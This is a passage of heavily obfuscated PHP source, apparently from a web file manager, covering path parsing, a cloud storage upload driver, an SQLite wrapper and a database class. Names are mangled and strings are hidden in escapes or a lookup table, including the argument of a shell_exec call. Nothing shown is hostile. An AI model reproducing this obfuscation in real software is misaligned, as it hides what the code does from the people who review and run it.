"\x7b\165\163\145\162\106\151\154\x65\124\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\163\145\162\x46\x69\x6c\x65\x54\171\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\x6f\x75\x70\x52\x6f\157\x74\123\x65\154\x66\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\x65\162\x53\x68\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\173\x75\163\145\x72\x53\150\141\162\x65\114\x69\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\x61\162\x65\124\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\x61\x72\x65\x49\164\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\163\x68\x61\x72\x65\111\164\145\x6d\x4c\x69\x6e\x6b\175"; const KOD_SEARCH = "\x7b\163\145\141\x72\143\150\x7d"; const KOD_BLOCK = "\x7b\x62\x6c\x6f\x63\153\175"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\173\x75\163\x65\162\122\x65\156\143\145\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\144\162\151\x76\x65\x72\x7d"; public static function typeList() { $¶€ÏÇ„À =& $_SERVER[Å¶¨Şêº]; return array($¶€ÏÇ„À[1249] => self::KOD_SOURCE, $¶€ÏÇ„À[1250] => self::KOD_USER_RECYCLE, $¶€ÏÇ„À[1251] => self::KOD_USER_FAV, $¶€ÏÇ„À[1252] => self::KOD_USER_FILE_TAG, $¶€ÏÇ„À[1253] => self::KOD_USER_FILE_TYPE, $¶€ÏÇ„À[1254] => self::KOD_GROUP_ROOT_SELF, $¶€ÏÇ„À[1255] => self::KOD_USER_SHARE, $¶€ÏÇ„À[1256] => self::KOD_USER_SHARE_LINK, $¶€ÏÇ„À[1257] => self::KOD_USER_SHARE_TO_ME, $¶€ÏÇ„À[1258] => self::KOD_SHARE_ITEM, $¶€ÏÇ„À[1259] => self::KOD_SHARE_LINK, $¶€ÏÇ„À[1260] => self::KOD_SEARCH, $¶€ÏÇ„À[1261] => self::KOD_BLOCK, $¶€ÏÇ„À[1262] => self::KOD_IO, $¶€ÏÇ„À[1263] => self::KOD_USER_RECENT, $¶€ÏÇ„À[1264] => self::KOD_USER_DRIVER); } public static function parse($Åå) { $Û¤ˆ‘¥¶ =& $_SERVER[Å¶¨Şêº]; $Åå = self::clear($Åå); $¼êÇƒ = array_values(self::typeList()); preg_match($Û¤ˆ‘¥¶[1265], $Åå, $ò‡’ˆƒ); $ÙÕˆÕù¯ = array($Û¤ˆ‘¥¶[431] => !1, $Û¤ˆ‘¥¶[1266] => !1, $Û¤ˆ‘¥¶[428] => !1, $Û¤ˆ‘¥¶[95] => $Åå, $Û¤ˆ‘¥¶[1166] => !1, $Û¤ˆ‘¥¶[1165] => $Û¤ˆ‘¥¶[12]); if (is_array($ò‡’ˆƒ) && count($ò‡’ˆƒ) == 5) { $¹šòÊ€á = $Û¤ˆ‘¥¶[1267] . $ò‡’ˆƒ[2] . $Û¤ˆ‘¥¶[337]; if (in_array($¹šòÊ€á, $¼êÇƒ)) { $ÙÕˆÕù¯[$Û¤ˆ‘¥¶[1166]] = $ò‡’ˆƒ[1]; $ÙÕˆÕù¯[$Û¤ˆ‘¥¶[43]] = $¹šòÊ€á; $ÙÕˆÕù¯[$Û¤ˆ‘¥¶[1268]] = substr($¹šòÊ€á, 1, -1); $ÙÕˆÕù¯[$Û¤ˆ‘¥¶[408]] = $ò‡’ˆƒ[3]; } $ÙÕˆÕù¯[$Û¤ˆ‘¥¶[1165]] = $ò‡’ˆƒ[4]; } $Ú§ª¢ğÉ = array($Û¤ˆ‘¥¶[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ÙÕˆÕù¯[$Û¤ˆ‘¥¶[1231]] = in_array($ÙÕˆÕù¯[$Û¤ˆ‘¥¶[43]], $Ú§ª¢ğÉ); return $ÙÕˆÕù¯; } public static function isTruePath($ó±›Çä¹) { $¸Ûêş³² =& $_SERVER[Å¶¨Şêº]; if (substr($ó±›Çä¹, 0, 1) != $¸Ûêş³²[1267]) { return !0; } if (strpos($ó±›Çä¹, $¸Ûêş³²[417]) === 0) { return !0; } if (strpos($ó±›Çä¹, $¸Ûêş³²[1235]) === 0) { return !0; } if (strpos($ó±›Çä¹, $¸Ûêş³²[1269]) === 0) { return !0; } if (strpos($ó±›Çä¹, $¸Ûêş³²[1270]) === 0) { return !0; } if (strpos($ó±›Çä¹, $¸Ûêş³²[1271]) === 0) { return !0; } return !1; } public static function clear($õÈÒÀšÇ) { $ Ó‚½¾é =& $_SERVER[Å¶¨Şêº]; $õÈÒÀšÇ = str_replace(array($ Ó‚½¾é[1075], $ Ó‚½¾é[19]), $ Ó‚½¾é[63], $õÈÒÀšÇ); $õÈÒÀšÇ = str_replace($ Ó‚½¾é[108], $ Ó‚½¾é[8], $õÈÒÀšÇ); $éúš†Õ = $ Ó‚½¾é[1272]; if (substr($õÈÒÀšÇ, 0, 3) == $ Ó‚½¾é[1273]) { $õÈÒÀšÇ = substr($õÈÒÀšÇ, 3); } while (strstr($õÈÒÀšÇ, $éúš†Õ)) { $õÈÒÀšÇ = str_replace($éúš†Õ, $ Ó‚½¾é[8], $õÈÒÀšÇ); } $õÈÒÀšÇ = preg_replace($ Ó‚½¾é[1274], $ Ó‚½¾é[8], $õÈÒÀšÇ); if ($õÈÒÀšÇ == $ Ó‚½¾é[8]) { return $ Ó‚½¾é[8]; } $õÈÒÀšÇ = rtrim($õÈÒÀšÇ, $ Ó‚½¾é[8]); return $õÈÒÀšÇ; } public static function sourceID($¹Ò’ßüÕ) { $®‰ŸÉõô =& $_SERVER[Å¶¨Şêº]; $Š¸¯Ë™° = self::parse($¹Ò’ßüÕ); if ($Š¸¯Ë™°[$®‰ŸÉõô[43]] !== self::KOD_SOURCE) { show_json(LNG($®‰ŸÉõô[1275]), !1); } return $Š¸¯Ë™°[$®‰ŸÉõô[408]]; } public static function make($ÎÚËÂ©) { if (!$ÎÚËÂ©) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÎÚËÂ©)); } public static function makeShare($ê¼¤ÃÍï, $ù¿¤ä³è) { return self::makePath(self::KOD_SHARE_ITEM, $ê¼¤ÃÍï, $ù¿¤ä³è); } public static function makeFileTypePath($ùÆ‡£ÎÕ) { return self::makePath(self::KOD_USER_FILE_TYPE, $ùÆ‡£ÎÕ); } public static function makeFileTagPath($‚ø»¬îé) { return self::makePath(self::KOD_USER_FILE_TAG, $‚ø»¬îé); } public static function makePath($€şŸå¾ó, $»ôå€òÏ = '', $ü›¡ñÆ = '') { $ÖƒÃ„À¶ =& $_SERVER[Å¶¨Şêº]; $Ññë³ß = substr($€şŸå¾ó, 1, -1); $íÈŠ¹Öë = $ÖƒÃ„À¶[1276] . $Ññë³ß . $ÖƒÃ„À¶[1277] . $»ôå€òÏ . $ÖƒÃ„À¶[1278]; $íÈŠ¹Öë = $ü›¡ñÆ ? $íÈŠ¹Öë . $ü›¡ñÆ . $ÖƒÃ„À¶[8] : $íÈŠ¹Öë; return $íÈŠ¹Öë; } public static function hashPath($©Ú–ÆšÍ, $¨ë—Úê = true) { $Ÿ²”ÀÏ =& $_SERVER[Å¶¨Şêº]; $¿“’Úøø = is_array($©Ú–ÆšÍ) ? $©Ú–ÆšÍ : IO::info($©Ú–ÆšÍ); $ŒòÍˆã™ = _get($¿“’Úøø, $Ÿ²”ÀÏ[1279], $Ÿ²”ÀÏ[12]); if (!$ŒòÍˆã™ && isset($¿“’Úøø[$Ÿ²”ÀÏ[411]])) { $¿“’Úøø = IO::info(KodIO::make($¿“’Úøø[$Ÿ²”ÀÏ[411]])); $ŒòÍˆã™ = _get($¿“’Úøø, $Ÿ²”ÀÏ[1279], $Ÿ²”ÀÏ[12]); } if (!$ŒòÍˆã™ && $¨ë—Úê) { $Ä—¤Üì = KodIO::parse($¿“’Úøø[$Ÿ²”ÀÏ[95]]); if (!$Ä—¤Üì[$Ÿ²”ÀÏ[43]]) { $ŒòÍˆã™ = IO::hashSimple($¿“’Úøø[$Ÿ²”ÀÏ[95]]); } } if (!$ŒòÍˆã™) { $ŒòÍˆã™ = md5($¿“’Úøø[$Ÿ²”ÀÏ[95]] . $¿“’Úøø[$Ÿ²”ÀÏ[87]] . $¿“’Úøø[$Ÿ²”ÀÏ[96]]); } return $ŒòÍˆã™; } public static function hashPathSafe($¨•²«ä°, $åÑÈĞğ = true) { $†Æ¢äÅÖ =& $_SERVER[Å¶¨Şêº]; $Èé›„Æš = self::hashPath($¨•²«ä°, $åÑÈĞğ); return md5($Èé›„Æš . $†Æ¢äÅÖ[1280] . Model($†Æ¢äÅÖ[768])->get($†Æ¢äÅÖ[769])); } public static function initSystemPath() { $¢ÄúÕ™ =& $_SERVER[Å¶¨Şêº]; if (defined($¢ÄúÕ™[1281])) { return; } define($¢ÄúÕ™[1281], self::systemPath($¢ÄúÕ™[1282])); define($¢ÄúÕ™[1283], self::systemPath($¢ÄúÕ™[1284])); define($¢ÄúÕ™[1285], self::systemPath($¢ÄúÕ™[1286])); define($¢ÄúÕ™[1287], self::systemPath($¢ÄúÕ™[1288])); IOHistory::bindEvent(); } public static function systemPath($Ó˜¤¢³) { $’¥¶û‰† =& $_SERVER[Å¶¨Şêº]; $î¼¤ïÖŞ = $’¥¶û‰†[1289] . ucfirst($Ó˜¤¢³); $ıèì‘™Ã = Model($’¥¶û‰†[768])->get($î¼¤ïÖŞ); if ($ıèì‘™Ã) { return $ıèì‘™Ã; } if ($Ó˜¤¢³ == $’¥¶û‰†[1282]) { $ıèì‘™Ã = self::make(Model($’¥¶û‰†[823])->systemRootPathAdd($’¥¶û‰†[543])); } else { $ıèì‘™Ã = self::systemPath($’¥¶û‰†[1282]); $âûà›Óø = self::sourceID($ıèì‘™Ã); $ıèì‘™Ã = self::make(Model($’¥¶û‰†[823])->mkdir($âûà›Óø, $Ó˜¤¢³)); } Model($’¥¶û‰†[768])->set($î¼¤ïÖŞ, $ıèì‘™Ã); return $ıèì‘™Ã; } public static function systemFolder($÷·îÏÜ¿) { $®²ßÊãÍ = IO_PATH_SYSTEM_SOURCE . $÷·îÏÜ¿; $ğÃÜ×£´ = Cache::get($®²ßÊãÍ); if (!$ğÃÜ×£´) { $û‚©¤ÙÛ = IO::infoFull($®²ßÊãÍ); if (!$û‚©¤ÙÛ) { $ğÃÜ×£´ = IO::mkdir($®²ßÊãÍ, REPEAT_SKIP); } else { $ğÃÜ×£´ = $û‚©¤ÙÛ[$_SERVER[Å¶¨Şêº][95]]; } Cache::set($®²ßÊãÍ, $ğÃÜ×£´, 3600 * 10); } return $ğÃÜ×£´; } public static function defaultDriver() { return Model($_SERVER[Å¶¨Şêº][765])->defaultDriver(); } public static function defaultIO() { $§é‹ç‹¼ =& $_SERVER[Å¶¨Şêº]; $ø‘åÃä± = self::defaultDriver(); return $§é‹ç‹¼[1290] . $ø‘åÃä±[$§é‹ç‹¼[408]] . $§é‹ç‹¼[1278]; } public static function defaultDriverInit() { static $ûöÔì¶‚ = false; if ($ûöÔì¶‚) { return $ûöÔì¶‚; } $ûöÔì¶‚ = IO::init(self::defaultIO()); return $ûöÔì¶‚; } public static function fileTypeList() { $­Şãåé€ =& $_SERVER[Å¶¨Şêº]; $îõ–Ÿ©û = $GLOBALS[$­Şãåé€[6]][$­Şãåé€[1291]]; foreach ($îõ–Ÿ©û as $¶ï¤ÉÕæ => $Ğó«’©) { $²ÑÙÏº’ = $­Şãåé€[1292] . $¶ï¤ÉÕæ; $çÀÙ…Ş = LNG($²ÑÙÏº’); if ($²ÑÙÏº’ != $çÀÙ…Ş) { $îõ–Ÿ©û[$¶ï¤ÉÕæ][$­Şãåé€[42]] = $çÀÙ…Ş; } } return $îõ–Ÿ©û; } public static function diskList($°¬öÔ¿Ô = true) { $§œÀŠ‘÷ = $_SERVER[Å¶¨Şêº][1293]; if ($°¬öÔ¿Ô) { $÷ûİ†îü = Cache::get($§œÀŠ‘÷); if (is_array($÷ûİ†îü)) { return $÷ûİ†îü; } } $÷ûİ†îü = self::diskListGet(); Cache::set($§œÀŠ‘÷, $÷ûİ†îü, 60); return $÷ûİ†îü; } public static function diskListGet() { $›Ê‚Âø† =& $_SERVER[Å¶¨Şêº]; $™—ÃÍÎ‰ = array(); if ($GLOBALS[$›Ê‚Âø†[6]][$›Ê‚Âø†[1294]] == $›Ê‚Âø†[1295]) { $¯™Ş¤À¼ = $›Ê‚Âø†[1296]; for ($ƒöÃ°×» = 0; $ƒöÃ°×» < strlen($¯™Ş¤À¼); $ƒöÃ°×»++) { $öîßÓĞá = $¯™Ş¤À¼[$ƒöÃ°×»] . $›Ê‚Âø†[1297]; if (file_exists($öîßÓĞá)) { $™—ÃÍÎ‰[] = $öîßÓĞá; } } return $™—ÃÍÎ‰; } if (!function_exists($›Ê‚Âø†[109])) { $™—ÃÍÎ‰[] = $›Ê‚Âø†[833]; return $™—ÃÍÎ‰; } $øİô´Áœ = explode($›Ê‚Âø†[19], shell_exec($›Ê‚Âø†[1298])); array_shift($øİô´Áœ); array_pop($øİô´Áœ); $é¬¡ò«– = array($›Ê‚Âø†[1299], $›Ê‚Âø†[1300], $›Ê‚Âø†[1301], $›Ê‚Âø†[1302], $›Ê‚Âø†[1303], $›Ê‚Âø†[1304], $›Ê‚Âø†[1305], $›Ê‚Âø†[1306]); foreach ($øİô´Áœ as $âŸåñšŒ) { $îàöòÓ• = preg_split($›Ê‚Âø†[1307], $âŸåñšŒ); $öîßÓĞá = $îàöòÓ•[count($îàöòÓ•) - 1]; if (!strstr($îàöòÓ•[0], $›Ê‚Âø†[1308]) || !$öîßÓĞá) { continue; } $ÜÍ»¢¶ø = rtrim($öîßÓĞá, $›Ê‚Âø†[8]) . $›Ê‚Âø†[8]; if (in_array($ÜÍ»¢¶ø, $é¬¡ò«–)) { continue; } $™—ÃÍÎ‰[] = $ÜÍ»¢¶ø; } return $™—ÃÍÎ‰; } public static function isSameDisk($¤åğÇùÌ, $€ÎäÙÅ”) { $èÎİ”š÷ =& $_SERVER[Å¶¨Şêº]; if ($GLOBALS[$èÎİ”š÷[6]][$èÎİ”š÷[1294]] == $èÎİ”š÷[1295]) { return strtolower(substr($¤åğÇùÌ, 0, 1)) == strtolower(substr($€ÎäÙÅ”, 0, 1)); } $Ì·ÄÙô = self::diskList(); $¬†ÔªÍ = !1; $³ÑøÑ²ü = !1; sort($Ì·ÄÙô); $Ì·ÄÙô = array_reverse($Ì·ÄÙô); $¤åğÇùÌ = rtrim($¤åğÇùÌ, $èÎİ”š÷[8]) . $èÎİ”š÷[8]; $€ÎäÙÅ” = rtrim($€ÎäÙÅ”, $èÎİ”š÷[8]) . $èÎİ”š÷[8]; foreach ($Ì·ÄÙô as $õŒÛ†é) { $œš¦ïÜ¨ = strlen($õŒÛ†é); if (!$¬†ÔªÍ && substr($¤åğÇùÌ, 0, $œš¦ïÜ¨) == $õŒÛ†é) { $¬†ÔªÍ = $õŒÛ†é; } if (!$³ÑøÑ²ü && substr($€ÎäÙÅ”, 0, $œš¦ïÜ¨) == $õŒÛ†é) { $³ÑøÑ²ü = $õŒÛ†é; } if ($¬†ÔªÍ && $³ÑøÑ²ü) { break; } } return $¬†ÔªÍ === $³ÑøÑ²ü; } public static function transferType($ùáÁ”Æº, $Œ‚€ˆĞ„) { $õ¾£ğ½ë =& $_SERVER[Å¶¨Şêº]; $÷½ïâÄ³ = self::driverType($ùáÁ”Æº); $ÊóÍú’ğ = self::driverType($Œ‚€ˆĞ„); if ($÷½ïâÄ³[$õ¾£ğ½ë[43]] == $ÊóÍú’ğ[$õ¾£ğ½ë[43]] && $÷½ïâÄ³[$õ¾£ğ½ë[1309]] == $ÊóÍú’ğ[$õ¾£ğ½ë[1309]]) { return $õ¾£ğ½ë[1310]; } if ($÷½ïâÄ³[$õ¾£ğ½ë[43]] == $õ¾£ğ½ë[866] && $ÊóÍú’ğ[$õ¾£ğ½ë[43]] == $õ¾£ğ½ë[117]) { return $õ¾£ğ½ë[1192]; } if ($÷½ïâÄ³[$õ¾£ğ½ë[43]] == $õ¾£ğ½ë[117] && $ÊóÍú’ğ[$õ¾£ğ½ë[43]] == $õ¾£ğ½ë[866]) { return $õ¾£ğ½ë[118]; } return $õ¾£ğ½ë[1311]; } public static function driverType($”ôıÜ¸) { $”Ø£Ÿ¨Æ =& $_SERVER[Å¶¨Şêº]; $•ËóçÁ– = str_replace($”Ø£Ÿ¨Æ[1312], $”Ø£Ÿ¨Æ[12], strtolower($”ôıÜ¸->getType())); if ($•ËóçÁ– == $”Ø£Ÿ¨Æ[755] || $•ËóçÁ– == $”Ø£Ÿ¨Æ[1313] || $•ËóçÁ– == $”Ø£Ÿ¨Æ[1314]) { $”ôıÜ¸ = self::defaultDriverInit(); } else { if ($•ËóçÁ– == $”Ø£Ÿ¨Æ[1202] || $•ËóçÁ– == $”Ø£Ÿ¨Æ[1315]) { $”ôıÜ¸ = IO::init($”ôıÜ¸->pathParse[$”Ø£Ÿ¨Æ[1148]]); } } $‹İÊ’Ê¾ = $”ôıÜ¸->path; $•ËóçÁ– = str_replace($”Ø£Ÿ¨Æ[1312], $”Ø£Ÿ¨Æ[12], strtolower($”ôıÜ¸->getType())); if ($•ËóçÁ– == $”Ø£Ÿ¨Æ[117]) { return array($”Ø£Ÿ¨Æ[43] => $”Ø£Ÿ¨Æ[117], $”Ø£Ÿ¨Æ[1309] => $”Ø£Ÿ¨Æ[12], $”Ø£Ÿ¨Æ[95] => $‹İÊ’Ê¾, $”Ø£Ÿ¨Æ[106] => $”ôıÜ¸); } return array($”Ø£Ÿ¨Æ[43] => $”Ø£Ÿ¨Æ[866], $”Ø£Ÿ¨Æ[1309] => $”ôıÜ¸->pathDriver, $”Ø£Ÿ¨Æ[95] => $‹İÊ’Ê¾, $”Ø£Ÿ¨Æ[106] => $”ôıÜ¸); } public static function pathDriverType($»Î‚‡Ğ) { return $»Î‚‡Ğ ? self::driverType(IO::init($»Î‚‡Ğ)) : !1; } public static function pathDriverLocal($²šÕİ›°) { $–›€–Ã— =& $_SERVER[Å¶¨Şêº]; $š ¸ª©„ = $²šÕİ›° ? self::driverType(IO::init($²šÕİ›°)) : !1; return $š ¸ª©„[$–›€–Ã—[43]] == $–›€–Ã—[117] ? !0 : !1; } public static function allowCover($¤ÎŸ€ä, $ÎèŸì¡Ä = true) { $®ì¼Ìù =& $_SERVER[Å¶¨Şêº]; if (is_string($¤ÎŸ€ä)) { $¤ÎŸ€ä = IO::info($¤ÎŸ€ä); } if (!$¤ÎŸ€ä || $¤ÎŸ€ä[$®ì¼Ìù[43]] == $®ì¼Ìù[86] || $¤ÎŸ€ä[$®ì¼Ìù[87]] <= 100) { return !1; } if (isset($¤ÎŸ€ä[$®ì¼Ìù[1316]]) || !$¤ÎŸ€ä[$®ì¼Ìù[95]]) { return !1; } static $’¸€÷¢• = false; if (!$’¸€÷¢• || !$ÎèŸì¡Ä) { $ÒÚõ’œö = self::driverType(IO::init($¤ÎŸ€ä[$®ì¼Ìù[95]])); $‰üœœ‹ø = $ÒÚõ’œö[$®ì¼Ìù[106]]; $’¸€÷¢• = $®ì¼Ìù[1317]; if ($ÒÚõ’œö[$®ì¼Ìù[43]] == $®ì¼Ìù[117]) { $’¸€÷¢• = $®ì¼Ìù[1318]; } if ($ÒÚõ’œö[$®ì¼Ìù[106]] && isset($ÒÚõ’œö[$®ì¼Ìù[106]]->config[$®ì¼Ìù[1319]]) && $ÒÚõ’œö[$®ì¼Ìù[106]]->config[$®ì¼Ìù[1319]]) { $’¸€÷¢• = $®ì¼Ìù[1318]; } } return $’¸€÷¢• == $®ì¼Ìù[1318] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($¥ô»ü·) { parent::__construct($¥ô»ü·); $this->signatureVersion($_SERVER[Å¶¨Şêº][227]); } public function uploadFormData($çŒ÷âëÉ, $¥‚¡ïÈÄ = 3600) { $É’Û©Û¸ =& $_SERVER[Å¶¨Şêº]; $î³¹ÂõÔ = $É’Û©Û¸[210]; $–îúµû = $É’Û©Û¸[242]; $ôÑ¯¢ƒ = $É’Û©Û¸[1320]; $éü¶¨Ñ½ = gmdate($É’Û©Û¸[1321], time() + $¥‚¡ïÈÄ); $¦ä‡Š‹ = (string) time() . $É’Û©Û¸[82] . (string) (time() + $¥‚¡ïÈÄ); $¯½¬¸‰‘ = array($É’Û©Û¸[1322] => $éü¶¨Ñ½, $É’Û©Û¸[1323] => array(array($É’Û©Û¸[1324] => $î³¹ÂõÔ), array($É’Û©Û¸[1325] => $this->bucket), array($É’Û©Û¸[1326], $É’Û©Û¸[1327], $É’Û©Û¸[12]), array($É’Û©Û¸[1328] => $ôÑ¯¢ƒ), array($É’Û©Û¸[1329] => $–îúµû), array($É’Û©Û¸[1330] => $this->accessKey), array($É’Û©Û¸[1331] => $¦ä‡Š‹))); $¯½¬¸‰‘ = json_encode($¯½¬¸‰‘); $ÖË´—²å = hash_hmac($É’Û©Û¸[242], $¦ä‡Š‹, $this->secret); $¤Ì†Ñíá = sha1($¯½¬¸‰‘); $•ª¨›íÚ = hash_hmac($É’Û©Û¸[242], $¤Ì†Ñíá, $ÖË´—²å); $á”Ï‹ì = array($É’Û©Û¸[1324] => $î³¹ÂõÔ, $É’Û©Û¸[1328] => $ôÑ¯¢ƒ, $É’Û©Û¸[1332] => base64_encode($¯½¬¸‰‘), $É’Û©Û¸[1329] => $–îúµû, $É’Û©Û¸[1330] => $this->accessKey, $É’Û©Û¸[1333] => $¦ä‡Š‹, $É’Û©Û¸[1334] => $•ª¨›íÚ, $É’Û©Û¸[193] => $this->getHost()); return $á”Ï‹ì; } public function fileOutLink($ş¤¬¦ƒØ) { $Ç§ú†¬° =& $_SERVER[Å¶¨Şêº]; if (substr($ş¤¬¦ƒØ, 0, 7) == $Ç§ú†¬°[1335]) { $ş¤¬¦ƒØ = $Ç§ú†¬°[1336] . substr($ş¤¬¦ƒØ, 7); } header($Ç§ú†¬°[172] . $ş¤¬¦ƒØ); die; } } goto a—ÑùëÓ£; C×‡µÓÁëä: class DbSqlite3 extends DbSqlite3Base { public function query($Í‰ÒÃ¢µ) { $‹¥é¹€ =& $_SERVER[Å¶¨Şêº]; if (!CacheLock::fileLock($‹¥é¹€[23])) { return !1; } $õÎ¥é±ù = parent::query($Í‰ÒÃ¢µ); CacheLock::fileUnLock($‹¥é¹€[23]); return $õÎ¥é±ù; } public function execute($Ğ†ŞçÔ˜) { $ÁŸ€³¬ı =& $_SERVER[Å¶¨Şêº]; if (!CacheLock::fileLock($ÁŸ€³¬ı[23])) { return !1; } $ŒŞù€í‡ = parent::execute($Ğ†ŞçÔ˜); CacheLock::fileUnLock($ÁŸ€³¬ı[23]); return $ŒŞù€í‡; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\x69\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\x6e\145\x71" => "\x3c\x3e", "\x67\164" => "\76", "\145\147\x74" => "\x3e\x3d", "\x6c\164" => "\x3c", "\145\x6c\x74" => "\74\x3d", "\156\157\x74\154\x69\153\145" => "\x4e\117\124\x20\x4c\111\113\105", "\x6c\151\153\145" => "\114\111\113\x45", "\x69\156" => "\111\x4e", "\x6e\157\x74\x69\x6e" => "\x4e\117\x54\x20\111\x4e", "\x6e\x6f\164\40\x69\156" => "\x4e\117\x54\x20\111\116", "\x62\145\x74\x77\145\x65\x6e" => "\102\105\x54\x57\105\105\116", "\156\157\x74\x62\145\x74\167\145\x65\x6e" => "\116\x4f\124\40\x42\105\124\127\x45\x45\x4e", "\x6e\157\164\40\x62\145\164\x77\x65\145\x6e" => "\116\117\124\x20\102\x45\x54\127\105\x45\116"); protected $selectSql = "\123\105\x4c\105\x43\x54\45\x44\x49\123\124\111\116\x43\x54\45\40\45\x46\x49\105\114\104\45\40\106\x52\117\x4d\x20\x25\124\101\102\114\x45\x25\x25\x4a\x4f\111\x4e\45\x25\x57\110\x45\122\105\45\x25\107\122\117\125\x50\x25\45\x48\101\126\x49\116\107\x25\x25\x4f\122\x44\x45\122\x25\45\114\x49\115\111\124\x25\x20\x25\x55\116\x49\117\116\x25\45\x43\x4f\x4d\115\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $íÙÏÎÖÜ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Å¶¨Şêº][957], $íÙÏÎÖÜ); } public function factory($Æ¦çÜ¤‹ = '') { $îÖçĞ§ˆ =& $_SERVER[Å¶¨Şêº]; $Æ¦çÜ¤‹ = $this->parseConfig($Æ¦çÜ¤‹); if (empty($Æ¦çÜ¤‹[$îÖçĞ§ˆ[958]])) { think_exception(think_lang($îÖçĞ§ˆ[959])); } $this->dbType = ucwords(strtolower($Æ¦çÜ¤‹[$îÖçĞ§ˆ[958]])); $«¢ƒ¨×ª = $îÖçĞ§ˆ[960] . $this->dbType; if (class_exists($«¢ƒ¨×ª)) { $‡šñÖÕ = new $«¢ƒ¨×ª($Æ¦çÜ¤‹); if ($îÖçĞ§ˆ[961] != strtolower($Æ¦çÜ¤‹[$îÖçĞ§ˆ[958]])) { $‡šñÖÕ->dbType = strtoupper($this->dbType); } else { $‡šñÖÕ->dbType = $this->_getDsnType($Æ¦çÜ¤‹[$îÖçĞ§ˆ[913]]); } } else { think_exception(think_lang($îÖçĞ§ˆ[962]) . $îÖçĞ§ˆ[963] . $«¢ƒ¨×ª); } return $‡šñÖÕ; } public function __call($¬ŞË¼åÔ, $‘Æùš‘) { if (method_exists($this, $¬ŞË¼åÔ)) { return call_user_func_array(array($this, $¬ŞË¼åÔ), $‘Æùš‘); } } protected function _getDsnType($é”¹¸ô³) { $Õ¾ˆ¿İÇ = explode($_SERVER[Å¶¨Şêº][4], $é”¹¸ô³); $Î··º¼ = strtoupper(trim($Õ¾ˆ¿İÇ[0])); return $Î··º¼; } private function parseConfig($‰Ø´Ã®‚ = '') { $×¿äêÎè =& $_SERVER[Å¶¨Şêº]; if (!empty($‰Ø´Ã®‚) && is_string($‰Ø´Ã®‚)) { $‰Ø´Ã®‚ = $this->parseDSN($‰Ø´Ã®‚); } elseif (is_array($‰Ø´Ã®‚)) { $‰Ø´Ã®‚ = array_change_key_case($‰Ø´Ã®‚); $‰Ø´Ã®‚ = array($×¿äêÎè[958] => $‰Ø´Ã®‚[$×¿äêÎè[964]], $×¿äêÎè[885] => $‰Ø´Ã®‚[$×¿äêÎè[965]], $×¿äêÎè[886] => $‰Ø´Ã®‚[$×¿äêÎè[966]], $×¿äêÎè[883] => $‰Ø´Ã®‚[$×¿äêÎè[967]], $×¿äêÎè[884] => $‰Ø´Ã®‚[$×¿äêÎè[968]], $×¿äêÎè[31] => $‰Ø´Ã®‚[$×¿äêÎè[969]], $×¿äêÎè[913] => $‰Ø´Ã®‚[$×¿äêÎè[970]], $×¿äêÎè[27] => isset($‰Ø´Ã®‚[$×¿äêÎè[971]]) ? $‰Ø´Ã®‚[$×¿äêÎè[971]] : array()); } elseif (empty($‰Ø´Ã®‚)) { if (think_config($×¿äêÎè[972]) && $×¿äêÎè[961] != strtolower(think_config($×¿äêÎè[973]))) { $‰Ø´Ã®‚ = $this->parseDSN(think_config($×¿äêÎè[972])); } else { $‰Ø´Ã®‚ = array($×¿äêÎè[958] => think_config($×¿äêÎè[973]), $×¿äêÎè[885] => think_config($×¿äêÎè[974]), $×¿äêÎè[886] => think_config($×¿äêÎè[975]), $×¿äêÎè[883] => think_config($×¿äêÎè[976]), $×¿äêÎè[884] => think_config($×¿äêÎè[977]), $×¿äêÎè[31] => think_config($×¿äêÎè[256]), $×¿äêÎè[913] => think_config($×¿äêÎè[972]), $×¿äêÎè[27] => think_config($×¿äêÎè[978])); } } return $‰Ø´Ã®‚; } protected function initConnect($ûîù¦²É = true) { if (1 == think_config($_SERVER[Å¶¨Şêº][32])) { $this->_linkID = $this->multiConnect($ûîù¦²É); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ãöèäâ => $ıÈÇÏíî) { $this->_linkID = $ıÈÇÏíî; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($‘–‹ÛÊ³ = false) { $ëÁÜó¾Ú =& $_SERVER[Å¶¨Şêº]; static $°Ã•ˆÔ = array(); static $ÇÅŸÙ¯ = -1; if (empty($°Ã•ˆÔ)) { foreach ($this->config as $ıŒ»ª­” => $Œ²Ö¹­ş) { $°Ã•ˆÔ[$ıŒ»ª­”] = explode($ëÁÜó¾Ú[60], $Œ²Ö¹­ş); } } if (think_config($ëÁÜó¾Ú[979])) { if ($‘–‹ÛÊ³ || think_config($ëÁÜó¾Ú[404]) === !0) { $şÅÑ¢ = floor(mt_rand(0, think_config($ëÁÜó¾Ú[980]) - 1)); $ÇÅŸÙ¯ = $şÅÑ¢; } else { if (is_numeric(think_config($ëÁÜó¾Ú[981]))) { $şÅÑ¢ = think_config($ëÁÜó¾Ú[981]); } else { $şÅÑ¢ = floor(mt_rand(think_config($ëÁÜó¾Ú[980]), count($°Ã•ˆÔ[$ëÁÜó¾Ú[883]]) - 1)); } } } else { $şÅÑ¢ 